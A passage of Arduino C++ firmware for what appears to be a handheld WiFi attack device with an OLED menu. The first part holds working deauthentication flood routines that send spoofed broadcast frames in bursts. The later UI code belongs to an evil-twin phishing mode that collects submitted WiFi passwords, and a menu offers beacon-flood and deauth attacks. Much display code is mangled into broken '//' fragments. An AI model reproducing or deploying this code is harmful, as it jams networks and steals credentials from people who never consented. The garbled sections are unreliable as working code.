        delay(interFrameDelayMs);
      }
    }
  } else {
    // delay，，Height
    for (int burst = 0; burst < burstTimes; burst++) {
      for (size_t r = 0; r < reasonCount; r++) {
        frame.reason = DEAUTH_REASONS[r];
        wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
        packetCount++;
      }
    }
  }
}

// SendDeauthFrame
inline __attribute__((always_inline)) void sendFixedReasonDeauthBurst(const uint8_t* bssid,
                                       uint16_t reason,
                                       int framesToSend,
                                       int &packetCount,
                                       int interFrameDelayMs) {
  DeauthFrame frame;
  // memcpy
  memcpy(&frame.source, bssid, 6);
  memcpy(&frame.access_point, bssid, 6);
  memcpy(&frame.destination, BROADCAST_MAC, 6);
  frame.reason = reason;
  if (interFrameDelayMs > 0) {
    for (int i = 0; i < framesToSend; i++) {
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
      delay(interFrameDelayMs);
    }
  } else {
    for (int i = 0; i < framesToSend; i++) {
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
    }
  }
}

// SendDeauthFrame（Frame）
inline __attribute__((always_inline)) void sendFixedReasonDeauthBurstUs(const uint8_t* bssid,
                                        uint16_t reason,
                                        int framesToSend,
                                        int &packetCount,
                                        unsigned int interFrameDelayUs) {
  DeauthFrame frame;
  memcpy(&frame.source, bssid, 6);
  memcpy(&frame.access_point, bssid, 6);
  memcpy(&frame.destination, BROADCAST_MAC, 6);
  frame.reason = reason;
  if (interFrameDelayUs > 0) {
    for (int i = 0; i < framesToSend; i++) {
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
      delayMicroseconds(interFrameDelayUs);
    }
  } else {
    for (int i = 0; i < framesToSend; i++) {
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
    }
  }
}

// BSSID（DEAUTH_REASONS）burstSend（Frame）
inline __attribute__((always_inline)) void sendDeauthBurstToBssidUs(const uint8_t* bssid,
                                     int burstTimes,
                                     int &packetCount,
                                     unsigned int interFrameDelayUs) {
  DeauthFrame frame;
  memcpy(&frame.source, bssid, 6);
  memcpy(&frame.access_point, bssid, 6);
  memcpy(&frame.destination, BROADCAST_MAC, 6);
  size_t reasonCount = sizeof(DEAUTH_REASONS) / sizeof(DEAUTH_REASONS[0]);
  for (int burst = 0; burst < burstTimes; burst++) {
    for (size_t r = 0; r < reasonCount; r++) {
      frame.reason = DEAUTH_REASONS[r];
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
      if (interFrameDelayUs > 0) delayMicroseconds(interFrameDelayUs);
    }
  }
}

// ============ OptSendFunc ============
// ModeSwitch
bool g_enhancedDeauthMode = true; // DefaultMode

// HeightSend：BuildFrame，memcpy
inline void sendDeauthBatch(const uint8_t* bssid, int batchSize, int &packetCount) {
  static DeauthFrame frames[3]; // 3Frame
  static bool initialized = false;
  static uint8_t lastBssid[6] = {0};

  // YesNoInitFrame（BSSID）
  if (!initialized || memcmp(lastBssid, bssid, 6) != 0) {
    for (int i = 0; i < 3; i++) {
      memcpy(frames[i].source, bssid, 6);
      memcpy(frames[i].access_point, bssid, 6);
      memcpy(frames[i].destination, BROADCAST_MAC, 6);
      frames[i].reason = DEAUTH_REASONS[i];
    }
    memcpy(lastBssid, bssid, 6);
    initialized = true;
  }

  // Send
  for (int batch = 0; batch < batchSize; batch++) {
    for (int i = 0; i < 3; i++) {
      wifi_tx_raw_frame(&frames[i], sizeof(DeauthFrame));
      packetCount++;
    }
  }
}

// Send：Attack，
inline void sendDeauthBatchEnhanced(const uint8_t* bssid, int batchSize, int &packetCount) {
  static DeauthFrame frames[6]; // Add6Frame：3 x 2
  static bool initialized = false;
  static uint8_t lastBssid[6] = {0};

  // YesNoInitFrame（BSSID）
  if (!initialized || memcmp(lastBssid, bssid, 6) != 0) {
    // AP -> Client （）
    for (int i = 0; i < 3; i++) {
      memcpy(frames[i].source, bssid, 6);
      memcpy(frames[i].access_point, bssid, 6);
      memcpy(frames[i].destination, BROADCAST_MAC, 6);
      frames[i].reason = DEAUTH_REASONS[i];
    }
    // Client -> AP （）
    for (int i = 0; i < 3; i++) {
      memcpy(frames[i+3].source, BROADCAST_MAC, 6);
      memcpy(frames[i+3].access_point, bssid, 6);
      memcpy(frames[i+3].destination, bssid, 6);
      frames[i+3].reason = DEAUTH_REASONS[i];
    }
    memcpy(lastBssid, bssid, 6);
    initialized = true;
  }

  // Send：Send
  for (int batch = 0; batch < batchSize; batch++) {
    // Send，AddSuccess
    for (int i = 0; i < 6; i++) {
      wifi_tx_raw_frame(&frames[i], sizeof(DeauthFrame));
      packetCount++;
    }
  }
}

// TargetVersion
inline void sendDeauthBurstIntensive(const uint8_t* bssid, int burstCount, int &packetCount) {
  DeauthFrame frame;
  const uint16_t intensiveReasons[] = {1, 2, 3, 4, 5, 6, 7, 8, 15, 16}; // 10

  for (int burst = 0; burst < burstCount; burst++) {
    // AP -> Broadcast
    for (int r = 0; r < 10; r++) {
      memcpy(frame.source, bssid, 6);
      memcpy(frame.access_point, bssid, 6);
      memcpy(frame.destination, BROADCAST_MAC, 6);
      frame.reason = intensiveReasons[r];
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
    }
    // Broadcast -> AP
    for (int r = 0; r < 10; r++) {
      memcpy(frame.source, BROADCAST_MAC, 6);
      memcpy(frame.access_point, bssid, 6);
      memcpy(frame.destination, bssid, 6);
      frame.reason = intensiveReasons[r];
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
    }
  }
}

// OptChannelSettingsFunc（Settings）
inline void setChannelOptimized(int channel) {
  if (!g_deauthState.channelSet || g_deauthState.lastChannel != channel) {
    wext_set_channel(WLAN0_NAME, channel);
    g_deauthState.lastChannel = channel;
    g_deauthState.channelSet = true;
  }
}

// AttackStopFunc
void stopAttack() {
  g_deauthState.running = false;
  g_deauthState.mode = ATTACK_IDLE;
  g_deauthState.channelSet = false;
  g_deauthState.lastChannel = -1;

  // Turn OffLED
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);

  Serial.println("=== AttackStopped ===");
}
// timing variables
unsigned long lastDownTime = 0;
unsigned long lastUpTime = 0;
unsigned long lastOkTime = 0;
const unsigned long DEBOUNCE_DELAY = 150;

// IMAGES
static const unsigned char PROGMEM image_wifi_not_connected__copy__bits[] = { 0x21, 0xf0, 0x00, 0x16, 0x0c, 0x00, 0x08, 0x03, 0x00, 0x25, 0xf0, 0x80, 0x42, 0x0c, 0x40, 0x89, 0x02, 0x20, 0x10, 0xa1, 0x00, 0x23, 0x58, 0x80, 0x04, 0x24, 0x00, 0x08, 0x52, 0x00, 0x01, 0xa8, 0x00, 0x02, 0x04, 0x00, 0x00, 0x42, 0x00, 0x00, 0xa1, 0x00, 0x00, 0x40, 0x80, 0x00, 0x00, 0x00 };

int scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    result.security_type = record->security;  // LogCryptoType
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  } else {
    // ScanDone
    g_scanDone = true;
  }
  return RTW_SUCCESS;
}
// Usage selectedmenu()

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi Networks...");
  scan_results.clear();
  SelectedVector.clear(); // EmptyMediumWiFiList
  g_scanDone = false;
  unsigned long startMs = millis();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    const unsigned long SCAN_TIMEOUT_MS = 2500; // LengthWait2.5
    while (!g_scanDone && (millis() - startMs) < SCAN_TIMEOUT_MS) {
      delay(10);
    }
    DEBUG_SER_PRINT(" Done!\n");
    // Select，ScanResultAlign
    selectedFlags.assign(scan_results.size(), 0);
    return 0;
  } else {
    DEBUG_SER_PRINT(" Failed!\n");
    return 1;
  }
}

// ScanFlowUI：TitleCenter+NewSSID
static void performScanWithUI(const char* title, unsigned long timeoutMs, int maxResults) {
  while (true) {
    //clearDisplay();
    //setTextColor(SSD1306_WHITE);
    //setTextSize(1);

    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);
    int titleW = //.getUTF8Width(title);
    int titleX = (//width() - titleW) / 2;
    //.setCursor(titleX, 24);
    //.print(title);
    ////);

    scan_results.clear();
    SelectedVector.clear();
    g_scanDone = false;
    unsigned long startMs = millis();
    // ScanWait：Medium"_-_-_-_-_""-_-_-_-_-"
    const char* frames[2] = {"_-_-_-_-_", "-_-_-_-_-"};
    int frameIndex = 0;
    const unsigned long animIntervalMs = 200;
    unsigned long lastAnimMs = 0;
    if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
      while (!g_scanDone && (millis() - startMs) < timeoutMs) {
        unsigned long nowMs = millis();
        if (nowMs - lastAnimMs >= animIntervalMs) {
          lastAnimMs = nowMs;
          //clearDisplay();
          //.setFontMode(1);
          //.setForegroundColor(SSD1306_WHITE);
          int tW = //.getUTF8Width(title);
          int tX = (//width() - tW) / 2;
          //.setCursor(tX, 24);
          //.print(title);
          const char* animText = frames[frameIndex & 1];
          int aW = //.getUTF8Width(animText);
          int aX = (//width() - aW) / 2;
          if (aX < 0) aX = 0;
          //.setCursor(aX, 48);
          //.print(animText);
          ////);
          frameIndex++;
        }
        delay(10);
      }
      if (maxResults > 0 && scan_results.size() > (size_t)maxResults) {
        scan_results.resize(maxResults);
      }
      selectedFlags.assign(scan_results.size(), 0);
    } else {
      Serial.println("ScanStartFailed，WaitStatus");
      while (true) delay(1000);
    }

    Serial.println("ScanDone");
    //clearDisplay();
    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);
    //.setCursor(5, 25);
    //.print("Done");
    ////);
    delay(300);
    menustate = 0;
    homeState = 0;
    homeStartIndex = 0;
    // g_homeBaseStartIndex Sync，
    break;
  }
}

// Usage contains()/addValue()
//uint8_t becaon_bssid[6];
inline bool isIndexSelected(int index) {
  return index >= 0 && (size_t)index < selectedFlags.size() && selectedFlags[(size_t)index] != 0;
}

void toggleSelection(int index) {
  bool found = false;
  int foundIndex = -1;

  // YesNoMedium
  for(size_t i = 0; i < SelectedVector.size(); i++) {
    if(SelectedVector[i] == index) {
      found = true;
      foundIndex = i;
      break;
    }
  }

  // MediumStatus
  if(found) {
    // DeleteMedium
    SelectedVector.erase(SelectedVector.begin() + foundIndex);
    if ((size_t)index < selectedFlags.size()) selectedFlags[(size_t)index] = 0;
  } else {
    // Medium
    SelectedVector.push_back(index);
    if (selectedFlags.size() != scan_results.size()) selectedFlags.assign(scan_results.size(), 0);
    if ((size_t)index < selectedFlags.size()) selectedFlags[(size_t)index] = 1;
  }
}

// DetectStringYesNoPacketMedium
bool containsChinese(const String& str) {
  for (size_t i = 0; i < (size_t)str.length(); i++) {
    if ((unsigned char)str[i] > 0x7F) {
      return true;
    }
  }
  return false;
}

String utf8TruncateToWidth(const String& input, int maxPixelWidth) {
  String out = input;
  if (//.getUTF8Width(out.c_str()) <= maxPixelWidth) return out;
  int ellipsisWidth = //.getUTF8Width("...");
  // Trim until text + ellipsis fits
  while (out.length() > 0 && (//.getUTF8Width(out.c_str()) + ellipsisWidth) > maxPixelWidth) {
    out.remove(out.length() - 1);
    // ensure we don't cut in the middle of a UTF-8 multibyte char
    while (out.length() > 0) {
      uint8_t last = (uint8_t)out[out.length() - 1];
      if ((last & 0xC0) == 0x80) {
        out.remove(out.length() - 1);
      } else {
        break;
      }
    }
  }
  if (out.length() == 0) return String("...");
  return out + "...";
}

// Width（Height）
String utf8ClipToWidthNoEllipsis(const String& input, int maxPixelWidth) {
  if (//.getUTF8Width(input.c_str()) <= maxPixelWidth) return input;
  String out = input;
  while (out.length() > 0 && //.getUTF8Width(out.c_str()) > maxPixelWidth) {
    out.remove(out.length() - 1);
    while (out.length() > 0) {
      uint8_t last = (uint8_t)out[out.length() - 1];
      if ((last & 0xC0) == 0x80) {
        out.remove(out.length() - 1);
      } else {
        break;
      }
    }
  }
  return out;
}

//  UTF-8 （），Back
static inline int advanceUtf8Index(const String& s, int start) {
  int i = start + 1;
  int n = s.length();
  while (i < n) {
    uint8_t b = (uint8_t)s[i];
    if ((b & 0xC0) != 0x80) break; // Yes，Desc
    i++;
  }
  return (i <= n) ? i : n;
}

// ===== UI Helpers: rounded highlight, chevron =====
void drawRightChevron(int y, int lineHeight, bool isSelected) {
  int x = //width() - UI_RIGHT_GUTTER - 8; //
  int ymid = y + lineHeight / 2;
  int color = isSelected ? SSD1306_BLACK : SSD1306_WHITE;
  //fillTriangle(x, ymid - 3, x, ymid + 3, x + 4, ymid, color);
}

void drawRoundedHighlight(int y, int height) {
  int width = //width() - UI_RIGHT_GUTTER; //
  int radius = 2; // SmallRadius
  //fillRoundRect(0, y, width, height, radius, SSD1306_WHITE);
}

// ===== OLED single-line helpers =====
// CleanCenterText，
static inline void oledDrawCenteredLine(const char* text, int baselineY) {
  //fillRect(0, baselineY - 9, //width(), 12, SSD1306_BLACK);
  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);
  int w = //.getUTF8Width(text);
  int x = (//width() - w) / 2;
  if (x < 0) x = 0;
  //.setCursor(x, baselineY);
  //.print(text);
  ////);
}

// ；Backtrue
static inline bool oledMaybeDrawCenteredLine(const char* text, int baselineY, unsigned long& lastDrawMs, unsigned long intervalMs) {
  unsigned long nowMs = millis();
  if (intervalMs == 0) return false; // 0
  if (nowMs - lastDrawMs < intervalMs) return false;
  oledDrawCenteredLine(text, baselineY);
  lastDrawMs = nowMs;
  return true;
}

//
void drawHomeScrollbar(int startIndex) {
  // All，
  if (HOME_MAX_ITEMS <= HOME_PAGE_SIZE) return;

  int barX = //width() - UI_RIGHT_GUTTER + 1; //
  int barWidth = UI_RIGHT_GUTTER - 2; // 1px
  int trackY = HOME_Y_OFFSET;
  int trackH = HOME_ITEM_HEIGHT * HOME_PAGE_SIZE;

  // （）
  //drawRoundRect(barX, trackY, barWidth, trackH, 2, SSD1306_WHITE);

  // SliderHeight
  float pageRatio = (float)HOME_PAGE_SIZE / (float)HOME_MAX_ITEMS;
  int computedThumb = (int)(trackH * pageRatio);
  int thumbH = (computedThumb < 6) ? 6 : computedThumb;
  // Slider
  float posRatio = (float)startIndex / (float)(HOME_MAX_ITEMS - HOME_PAGE_SIZE);
  int thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);

  // Slider
  //fillRoundRect(barX + 1, thumbY, barWidth - 2, thumbH, 2, SSD1306_WHITE);
}

// ：
void drawHomeScrollbarFraction(float startIndexF) {
  if (HOME_MAX_ITEMS <= HOME_PAGE_SIZE) return;

  int barX = //width() - UI_RIGHT_GUTTER + 1;
  int barWidth = UI_RIGHT_GUTTER - 2;
  int trackY = HOME_Y_OFFSET;
  int trackH = HOME_ITEM_HEIGHT * HOME_PAGE_SIZE;

  //drawRoundRect(barX, trackY, barWidth, trackH, 2, SSD1306_WHITE);

  float pageRatio = (float)HOME_PAGE_SIZE / (float)HOME_MAX_ITEMS;
  int computedThumb = (int)(trackH * pageRatio);
  int thumbH = (computedThumb < 6) ? 6 : computedThumb;

  float denom = (float)(HOME_MAX_ITEMS - HOME_PAGE_SIZE);
  float posRatio = denom > 0.0f ? (startIndexF / denom) : 0.0f;
  if (posRatio < 0.0f) posRatio = 0.0f;
  if (posRatio > 1.0f) posRatio = 1.0f;
  int thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);

  //fillRoundRect(barX + 1, thumbY, barWidth - 2, thumbH, 2, SSD1306_WHITE);
}

//

// =====  =====
// ：（Height） - ，Usage drawHomeMenuBasePaged
// void drawHomeMenuBase() {
//   // Func drawHomeMenuBasePaged  drawHomeMenuBasePaged_NoFlush
// }

// ===== WebTest OLED Pages (defined after globals to fix forward references) =====
void drawWebTestMain() {
  //clearDisplay();
  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);

  //
  const char* line1_text = "↑ Info ↑";
  int w1 = //.getUTF8Width(line1_text);
  int x1_center = (//width() - w1) / 2;
  //.setCursor(x1_center, 12);
  //.print(line1_text);


  //
  //.setCursor(15, 28);
  //.print("StopPhishingBack");
  int left_arrow2_x = 5;
  int arrow2_y = 22;
  //
  //fillTriangle(left_arrow2_x + 4, arrow2_y - 3, left_arrow2_x + 4, arrow2_y + 3, left_arrow2_x - 2, arrow2_y, SSD1306_WHITE);

  //
  const char* line3_text = "ViewRecvPassword";
  int w3 = //.getUTF8Width(line3_text);
  int x3_right = //width() - w3 - 15;
  //.setCursor(x3_right, 44);
  //.print(line3_text);
  int right_arrow3_x = //width() - 5;
  int arrow3_y = 38;
  //
  //fillTriangle(right_arrow3_x - 4, arrow3_y - 3, right_arrow3_x - 4, arrow3_y + 3, right_arrow3_x + 2, arrow3_y, SSD1306_WHITE);
  // "ViewRecvPassword"RadiusBorder：
  // ：
  // - Password
  // - Password，Border（4）
  {
    bool should_draw_border = false;
    if (webtest_border_always_on) {
      should_draw_border = true;
    }
    if (webtest_flash_remaining_toggles > 0) {
      unsigned long now_ms = millis();
      // 150ms
      if (now_ms - webtest_last_flash_toggle_ms >= 150UL) {
        webtest_last_flash_toggle_ms = now_ms;
        webtest_border_flash_visible = !webtest_border_flash_visible;
        webtest_flash_remaining_toggles--;
      }
      // （，）
      should_draw_border = webtest_border_flash_visible;
    }
    if (should_draw_border) {
      int text_y_baseline = 44;
      int text_height = 10; // Height
      int pad_x = 2;
      int pad_y = 2;
      int rect_x = x3_right - pad_x - 1;
      int rect_y = text_y_baseline - text_height - pad_y;
      int rect_w = w3 + pad_x * 2 + 2;
      int rect_h = text_height + pad_y * 2;
      int r = 3; // Radius
      //drawRoundRect(rect_x, rect_y, rect_w, rect_h, r, SSD1306_WHITE);
    }
  }

  //
  const char* line4_text = "↓ RunStatus ↓";
  int w4 = //.getUTF8Width(line4_text);
  int x4_center = (//width() - w4) / 2;
  //.setCursor(x4_center, 60);
  //.print(line4_text);

  ////);
}

void drawWebTestInfo() {
  //clearDisplay();
  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);
  const char* title = "[Info]";
  int w = //.getUTF8Width(title);
  int x = (//width() - w) / 2;
  //.setCursor(x, 12);
  //.print(title);
  String line2 = web_test_ssid_dynamic;
  w = //.getUTF8Width(line2.c_str());
  x = (//width() - w) / 2;
  //.setCursor(x, 28);
  //.print(line2);
  String band = (is24GChannel(web_test_channel_dynamic) ? "2.4" : (is5GChannel(web_test_channel_dynamic) ? "5G" : "?"));
  String line3 = String(": ") + band + String("|Channel: ") + String(web_test_channel_dynamic);
  w = //.getUTF8Width(line3.c_str());
  x = (//width() - w) / 2;
  //.setCursor(x, 44);
  //.print(line3);
  const char* hint = "↓ Back ↓";
  w = //.getUTF8Width(hint);
  x = (//width() - w) / 2;
  //.setCursor(x, 60);
  //.print(hint);
  ////);
}

void drawWebTestPasswords() {
  //clearDisplay();
  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);
  //.setCursor(5, 12);
  //.print("< Back");
  const char* title = "[PasswordList]";
  int w = //.getUTF8Width(title);
  int x = //width() - w - 2;
  //.setCursor(x, 12);
  //.print(title);
  const int startY = 28;
  const int lineH = 14;
  const int scrollbarWidth = 3; // Width
  int y = startY;
  if (web_test_submitted_texts.empty()) {
    const char* emptyMsg = "RecvPassword";
    w = //.getUTF8Width(emptyMsg);
    x = (//width() - w) / 2;
    //.setCursor(x, 40);
    //.print(emptyMsg);
  } else {
    int totalItems = (int)web_test_submitted_texts.size();
    if (webtest_password_scroll < 0) webtest_password_scroll = 0;
    if (webtest_password_scroll > totalItems - 1) webtest_password_scroll = totalItems > 0 ? totalItems - 1 : 0;
    int usedLines = 0;
    for (int i = webtest_password_scroll; i < (int)web_test_submitted_texts.size() && usedLines < 3; i++) {
      String txt = web_test_submitted_texts[i];
      String remaining = txt;
      bool firstLineOfEntry = true;
      while (remaining.length() > 0 && usedLines < 3) {
        int widthAvail = //width() - 6 - (scrollbarWidth + 1); // 1Spacing
        int tw = //.getUTF8Width(remaining.c_str());
        String seg = remaining;
        if (tw > widthAvail) {
          int approx = (remaining.length() * widthAvail) / tw;
          if (approx <= 0) approx = 1;
          seg = remaining.substring(0, approx);
          remaining = remaining.substring(approx);
        } else {
          remaining = "";
        }
        // ：Log "> "，
        String line = seg;
        if (firstLineOfEntry) {
          line = String("> ") + line;
          firstLineOfEntry = false;
        }
        //.setCursor(2, y);
        //.print(line);
        y += lineH;
        usedLines++;
      }
    }
    // （）
    // totalItems
    if (totalItems > 1) {
      int trackX = //width() - scrollbarWidth;
      int trackY = startY; // Align
      int trackH = 3 * lineH; //
      // Height
      if (trackY + trackH > //height()) {
        trackH = //height() - trackY;
      }
      if (trackH < 6) trackH = 6; // SmallHeight
      // （Packet）
      //drawLine(trackX, trackY, trackX, trackY + trackH - 1, SSD1306_WHITE);
      // HeightSmall6px，
      int thumbH = (trackH * 1) / std::max(totalItems, 3); // Large1
      if (thumbH < 6) thumbH = 6;
      if (thumbH > trackH) thumbH = trackH;
      float posRatio = (float)webtest_password_scroll / (float)(totalItems - 1);
      int thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);
      // （）
      //fillRect(trackX, thumbY, scrollbarWidth, thumbH, SSD1306_WHITE);
    }
  }
  ////);
}

void drawWebTestStatus() {
  //clearDisplay();
  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);
  {
    const char* t = "↑ Back ↑";
    int w = //.getUTF8Width(t);
    int x = (//width() - w) / 2;
    //.setCursor(x, 12);
    //.print(t);
  }
  // bool apRunning = web_test_active; // unused
  String l2 = String("SendDeauthFrame");
  {
    int w = //.getUTF8Width(l2.c_str());
    int x = (//width() - w) / 2;
    //.setCursor(x, 28);
    //.print(l2);
  }
  String l3 = String("WebService: ") + (web_server_active ? "RunMedium" : "Run");
  {
    int w = //.getUTF8Width(l3.c_str());
    int x = (//width() - w) / 2;
    //.setCursor(x, 44);
    //.print(l3);
  }
  String l4 = String("DNSServer: ") + (dns_server_active ? "RunMedium" : "Run");
  {
    int w = //.getUTF8Width(l4.c_str());
    int x = (//width() - w) / 2;
    //.setCursor(x, 60);
    //.print(l4);
  }
  ////);
}

// Pagination（Height）- Attack
static int g_homeBaseStartIndex = 0;
void drawHomeMenuBasePaged(int startIndex) {
  //clearDisplay();
  //setTextSize(1);
  // Proj
  int currentPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - startIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - startIndex);
  for (int i = 0; i < currentPageItems; i++) {
    int menuIndex = startIndex + i;
    if (menuIndex >= HOME_MAX_ITEMS) break;
    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT;
    int textY = rectY + 12; //
    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);
    //.setCursor(5, textY);
    //.print(g_homeMenuItems[menuIndex].label);
    // UsageAttack
    drawRightChevron(rectY, HOME_RECT_HEIGHT, false);
  }
  //
  drawHomeScrollbar(startIndex);
  ////);
}
// Version：FrameMedium
void drawHomeMenuBasePaged_NoFlush(int startIndex) {
  //clearDisplay();
  //setTextSize(1);
  // Proj
  int currentPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - startIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - startIndex);
  for (int i = 0; i < currentPageItems; i++) {
    int menuIndex = startIndex + i;
    if (menuIndex >= HOME_MAX_ITEMS) break;
    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT;
    int textY = rectY + 13; // 2px：+11+13

    // Tag
    String label = g_homeMenuItems[menuIndex].label;
    int maxTextWidth = //width() - UI_RIGHT_GUTTER - 15;
    int labelWidth = //.getUTF8Width(label.c_str());
    if (labelWidth > maxTextWidth) {
      while (label.length() > 0 &&
             //.getUTF8Width(label.c_str()) > maxTextWidth - 20) {
        label.remove(label.length() - 1);
        while (label.length() > 0 && ((uint8_t)label[label.length()-1] & 0xC0) == 0x80) {
          label.remove(label.length() - 1);
        }
      }
      label += "..";
    }

    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);
    //.setCursor(5, textY);
    //.print(label);
    drawRightChevron(rectY, HOME_RECT_HEIGHT, false);
  }
  // （Version）
  drawHomeScrollbar(startIndex);
}
void drawHomeMenuBasePagedShim() { drawHomeMenuBasePaged_NoFlush(g_homeBaseStartIndex); }

// ：y（）。/，。
static inline void drawHomePageWithOffset_NoFlush(int startIndex, int yOffset) {
  //setTextSize(1);
  // Proj
  int currentPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - startIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - startIndex);
  for (int i = 0; i < currentPageItems; i++) {
    int menuIndex = startIndex + i;
    if (menuIndex >= HOME_MAX_ITEMS) break;
    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT + yOffset;
    int textY = rectY + 13; // 2px：+11+13
    // ，
    if (rectY > //height() || rectY + HOME_RECT_HEIGHT < 0) continue;

    // Tag
    String label = g_homeMenuItems[menuIndex].label;
    int maxTextWidth = //width() - UI_RIGHT_GUTTER - 15;
    int labelWidth = //.getUTF8Width(label.c_str());
    if (labelWidth > maxTextWidth) {
      while (label.length() > 0 &&
             //.getUTF8Width(label.c_str()) > maxTextWidth - 20) {
        label.remove(label.length() - 1);
        while (label.length() > 0 && ((uint8_t)label[label.length()-1] & 0xC0) == 0x80) {
          label.remove(label.length() - 1);
        }
      }
      label += "..";
    }

    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);
    //.setCursor(5, textY);
    //.print(label);
    drawRightChevron(rectY, HOME_RECT_HEIGHT, false);
  }
}

// ：fromStartIndextoStartIndex（1）List
static inline void animateHomePageFlip(int fromStartIndex, int toStartIndex) {
  if (fromStartIndex == toStartIndex) return;
  int delta = toStartIndex - fromStartIndex;
  if (delta != 1 && delta != -1) {
    //
    drawHomeMenuBasePaged(fromStartIndex);
    return;
  }
  const int delayPerStepMs = SELECT_MOVE_TOTAL_MS / ANIM_STEPS;
  unsigned long nextStepDeadline = millis() + delayPerStepMs;
  for (int s = 1; s <= ANIM_STEPS; s++) {
    int offset = (HOME_ITEM_HEIGHT * s) / ANIM_STEPS; // 0..H
    int dir = (delta > 0) ? 1 : -1; // +1: ；-1:
    int fromYOffset = (dir > 0) ? -offset : offset;
    int toYOffset = (dir > 0) ? (HOME_ITEM_HEIGHT - offset) : -(HOME_ITEM_HEIGHT - offset);

    //clearDisplay();
    // （）
    if (dir > 0) {
      // ：，
      drawHomePageWithOffset_NoFlush(toStartIndex, toYOffset);
      drawHomePageWithOffset_NoFlush(fromStartIndex, fromYOffset);
    } else {
      // ：，
      drawHomePageWithOffset_NoFlush(fromStartIndex, fromYOffset);
      drawHomePageWithOffset_NoFlush(toStartIndex, toYOffset);
    }

    // Progress
    float progress = (float)offset / (float)HOME_ITEM_HEIGHT; // 0..1
    float startIndexF = (float)fromStartIndex + progress * (float)delta;
    drawHomeScrollbarFraction(startIndexF);

    if ((s % DISPLAY_FLUSH_EVERY_FRAMES) == 0 || s == ANIM_STEPS) {
      ////);
    }
    if (delayPerStepMs > 0) {
      while ((long)(millis() - nextStepDeadline) < 0) {
        // Input
      }
      nextStepDeadline += delayPerStepMs;
    }
  }
}

// ===== Generic animation + shims to reduce duplication =====
static int g_deauthBaseStartIndex = 0;
static int g_ssidBaseStartIndex = 0;

void drawDeauthMenuBaseShim() { drawDeauthMenuBase_NoFlush(g_deauthBaseStartIndex); }
void drawSsidPageBaseShim() { drawSsidPageBase_NoFlush(g_ssidBaseStartIndex); }

static inline void animateSelectionGeneric(
  int yFrom,
  int yTo,
  int rectHeight,
  int cornerRadius,
  bool useFullWidth,
  bool doubleOutline,
  void (*drawBaseNoFlush)()
) {
  const int delayPerStepMs = SELECT_MOVE_TOTAL_MS / ANIM_STEPS;
  const int width = useFullWidth ? //width() : (//width() - UI_RIGHT_GUTTER);
  unsigned long startMs = millis();
  unsigned long nextStepDeadline = startMs + delayPerStepMs;
  for (int s = 1; s <= ANIM_STEPS; s++) {
    int y = yFrom + ((yTo - yFrom) * s) / ANIM_STEPS;
    drawBaseNoFlush();
    //drawRoundRect(0, y, width, rectHeight, cornerRadius, SSD1306_WHITE);
    if (doubleOutline) {
      //drawRoundRect(1, y + 1, width - 2, rectHeight - 2, cornerRadius, SSD1306_WHITE);
    }
    if ((s % DISPLAY_FLUSH_EVERY_FRAMES) == 0 || s == ANIM_STEPS) {
      ////);
    }
    // WaitFrameTime
    if (delayPerStepMs > 0) {
      while ((long)(millis() - nextStepDeadline) < 0) {
        // Input/Task（Empty）
        // yield();
      }
      nextStepDeadline += delayPerStepMs;
    }
  }
}

// ：AttackMenu（Height）
void drawAttackMenuBase() {
  //clearDisplay();
  //setTextSize(1);
  const char* menuItems[] = {
    "DeauthCertifyAttack",
    "SendBeaconFrameAttack",
    "BeaconFrame+Deauth",
    "《 Back 》"
  };
  for (int i = 0; i < 4; i++) {
    int yPos = 2 + i * 16;
    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);
    //.setCursor(5, yPos+10);
    //.print(menuItems[i]);
    drawRightChevron(yPos-2, 14, false);
